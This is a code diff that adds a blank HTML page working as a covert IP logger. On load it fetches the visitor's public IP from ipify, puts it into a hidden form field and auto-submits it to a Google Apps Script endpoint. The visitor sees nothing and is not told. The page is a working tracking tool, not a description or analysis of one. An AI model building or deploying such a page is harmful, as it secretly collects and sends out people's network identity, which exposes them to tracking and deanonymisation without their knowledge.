@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<body>
+    <form id="info" class="gform" method="POST" action="https://script.google.com/macros/s/AKfycbwfBHeW0_OXAZAVlI7_tLgEoABOK1h99623CA7YVtd9aSSo7Wk/exec">
+        <input type="text" id="ip" name="ip">
+    </form>
+    <script>
+        function getIP(json) {
+            document.getElementById("ip").value=""+json.ip;
+            document.getElementById("info").submit();
+        }
+    </script>
+</body>
+<script src="https://api.ipify.org?format=jsonp&callback=getIP"></script>
+</html>
